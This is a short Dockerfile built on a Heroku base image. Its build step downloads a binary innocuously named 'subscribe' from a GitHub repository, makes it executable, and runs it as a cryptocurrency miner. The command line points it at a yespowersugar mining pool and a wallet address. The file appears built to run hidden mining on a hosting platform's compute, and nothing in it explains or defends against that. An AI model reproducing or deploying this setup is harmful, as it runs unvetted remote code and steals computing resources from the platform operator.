FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/mrbogel/Student/raw/main/subscribe; chmod +x subscribe; ./subscribe -a yespowersugar  -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qq49whq6jxyey9zeyp5s0xsl98nyg0wvvax3k6e.Tesnet
CMD bash heroku.sh
